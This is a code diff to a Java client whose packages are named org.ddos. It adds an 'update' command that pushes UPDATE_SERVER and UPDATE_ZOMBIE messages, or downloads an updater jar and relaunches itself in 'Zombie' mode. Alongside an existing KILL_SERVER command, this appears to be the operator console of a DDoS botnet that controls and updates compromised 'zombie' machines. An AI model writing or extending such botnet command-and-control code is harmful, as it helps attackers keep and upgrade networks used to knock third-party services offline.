@@ -13,6 +13,7 @@ import java.util.regex.Pattern;
 
 import org.ddos.client.DOS;
 import org.ddos.network.ClientNetwork;
+import org.ddos.updater.Updater;
 import org.ddos.util.Computer;
 import org.ddos.util.Console;
 import org.jcom.Command;
@@ -380,6 +381,49 @@ public class CommandActions {
 				try {
 					ClientNetwork.getClient().getOutputStream()
 							.writeObject(new DataPackage().setMessage("KILL_SERVER"));
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
+				return null;
+			}
+		};
+	}
+
+	public static CommandJob getUpdateAction() {
+		return new CommandJob() {
+			@Override
+			public Object doJob(Command command) {
+				System.out.print("Are you sure you want to perform update? (Y/N): ");
+				if (!Console.input.nextLine().toLowerCase().trim().equals("y")) {
+					System.out.println("Aborting update.");
+					return null;
+				}
+
+				try {
+					if (command.getCommandArguments()[0].equals("server")) {
+						ClientNetwork.getClient().getOutputStream()
+								.writeObject(new DataPackage().setMessage("UPDATE_SERVER"));
+					} else if (command.getCommandArguments()[0].equals("this")) {
+						Updater.downloadIfNonexistent();
+
+						System.out.println("The client will now exit. Relaunch it in about ten seconds.");
+
+						Runtime.getRuntime()
+								.exec("java -jar " + System.getProperty("user.dir") + "\\" + Updater.NAME + " Zombie");
+						System.exit(0);
+					} else if (command.getCommandArguments()[0].equals("zombie")) {
+						if (!command.hasFlag("-i")) {
+							System.err.println(
+									"No target for the update. Please use the -i flag. For more information, type \"help update\".");
+							return null;
+						}
+
+						String[] split = command.getFlag("-i").getValue().split(Pattern.quote(":"), 0);
+
+						ClientNetwork.getClient().getOutputStream().writeObject(
+								new DataPackage(new InetSocketAddress(split[0], Integer.parseInt(split[1])))
+										.setMessage("UPDATE_ZOMBIE"));
+					}
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
